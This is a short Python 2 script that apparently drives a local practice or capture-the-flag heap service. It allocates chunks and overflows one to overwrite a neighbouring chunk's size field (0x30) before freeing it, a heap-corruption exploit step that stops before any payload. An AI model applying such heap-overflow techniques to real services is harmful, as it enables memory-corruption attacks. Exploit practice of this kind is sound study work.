import socket
import struct
q = lambda x: struct.pack("Q", x)
s = socket.create_connection(("127.0.0.1", 4000))

def malloc(sz):
  s.send("1\n%d\n" % sz)
  dat = s.recv(8192)
  print dat
  if "OK" in dat:
    return int(dat.split("\n")[0])
  else:
    return None

def free(idx):
  s.send("3\n%d\n" % idx)
  print s.recv(8192)

def load(idx, dat):
  s.send("2\n%d\n%d\n" % (idx, len(dat)))
  s.send(dat)
  print s.recv(8192)
  

malloc(0x10)
malloc(0x10)
load(1, "a"*0x10 + "c"*8 + q(0x30) + "b"*0x18)
free(2)


